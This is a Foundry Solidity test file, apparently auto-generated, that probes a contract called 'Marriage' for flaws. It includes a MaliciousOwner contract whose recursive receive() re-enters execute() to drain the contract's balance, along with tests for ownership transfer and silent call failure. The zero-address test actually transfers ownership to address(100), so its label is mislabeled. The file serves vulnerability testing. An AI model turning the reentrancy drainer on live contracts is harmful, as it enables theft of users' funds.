// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x958a8f594101d2c0485a52319f29b2647f2ebc06.sol";

contract RevertingContract {
    receive() external payable {
        revert("Forced revert for silent failure test");
    }
}

contract MaliciousOwner {
    Marriage public target;
    uint256 public reentrancyCount;

    constructor(address _target) {
        target = Marriage(_target);
    }

    function acceptOwnership() public {
        target.acceptOwnership();
    }

    function attack() public payable {
        // Initiate attack by calling execute on self
        target.execute(address(this), 1 ether, "");
    }

    receive() external payable {
        reentrancyCount++;
        if (address(target).balance > 0) {
            // Recursive reentrancy call
            target.execute(address(this), address(target).balance, "");
        }
    }
}

contract MarriageTest is Test {
    Marriage marriage;
    address owner = address(0x1);

    function setUp() public {
        vm.prank(owner);
        marriage = new Marriage(owner);
    }

    function testChangeOwnerToZeroAddress() public {
        // Capture initial state
        console2.log("--- BEFORE-Trigger Ownership Change ---");
        address initialOwner = marriage.owner();
        console2.log("Initial owner:", initialOwner);

        // Trigger vulnerability
        console2.log("--- Trigger ChangeOwner & AcceptOwnership ---");
        vm.prank(owner);
        marriage.changeOwner(address(100));
        vm.prank(address(100));
        marriage.acceptOwnership();

        // Capture final state
        console2.log("--- AFTER-Trigger Ownership Change ---");
        address finalOwner = marriage.owner();
        console2.log("Final owner:", finalOwner);

        // Validate vulnerability
        if (finalOwner == address(100)) {
            console2.log("Vulnerability Exists: Contract ownership changed to zero address");
        } else {
            console2.log("Vulnerability not Exist: Failed to change contract ownership to zero address");
        }
    }

    function testReentrancyAttack() public {
        // Setup initial state
        vm.deal(address(marriage), 10 ether);
        console2.log("--- BEFORE-Trigger Reentrancy ---");
        uint256 initialBalance = address(marriage).balance;
        console2.log("Initial contract balance:", initialBalance, "wei");

        // Execute ownership transfer
        MaliciousOwner attacker = new MaliciousOwner(address(marriage));
        vm.prank(owner);
        marriage.changeOwner(address(attacker));
        vm.prank(address(attacker));
        attacker.acceptOwnership();

        // Verify ownership before attack
        address ownerBefore = marriage.owner();
        console2.log("Contract owner before attack:", ownerBefore);

        // Execute reentrancy attack
        console2.log("--- Trigger Attack ---");
        vm.prank(address(attacker));
        attacker.attack();

        // Capture final state
        console2.log("--- AFTER-Trigger Reentrancy ---");
        uint256 finalBalance = address(marriage).balance;
        console2.log("Final contract balance:", finalBalance, "wei");

        // Validate vulnerability
        bool reentrancyConfirmed = attacker.reentrancyCount() > 1;
        bool fundsDrained = finalBalance == 0;
        
        if (reentrancyConfirmed && fundsDrained) {
            console2.log("Reentrancy count:", attacker.reentrancyCount());
            console2.log("Vulnerability Exists: Reentrancy drained contract funds");
        } else {
            console2.log("Vulnerability not Exist: Failed to drain contract via reentrancy");
        }
    }

    function testExecuteSilentFailure() public {
        // Setup reverting contract and funding
        RevertingContract reverter = new RevertingContract();
        vm.deal(address(marriage), 1 ether);
        
        // Capture initial state
        console2.log("--- BEFORE-Trigger Silent Failure ---");
        uint256 initialBalance = address(marriage).balance;
        address initialOwner = marriage.owner();
        console2.log("Initial contract balance:", initialBalance, "wei");
        console2.log("Initial owner:", initialOwner);

        // Trigger vulnerable call
        console2.log("--- Trigger Execute (Force Failure) ---");
        vm.prank(owner);
        marriage.execute(address(reverter), 1 ether, "");

        // Capture final state
        console2.log("--- AFTER-Trigger Silent Failure ---");
        uint256 finalBalance = address(marriage).balance;
        address finalOwner = marriage.owner();
        console2.log("Final contract balance:", finalBalance, "wei");
        console2.log("Final owner:", finalOwner);

        // Validate vulnerability
        if (initialBalance == finalBalance) {
            console2.log("Vulnerability Exists: Silent failure occurred without state change");
        } else {
            console2.log("Vulnerability not Exist: Contract state changed unexpectedly");
        }
    }
}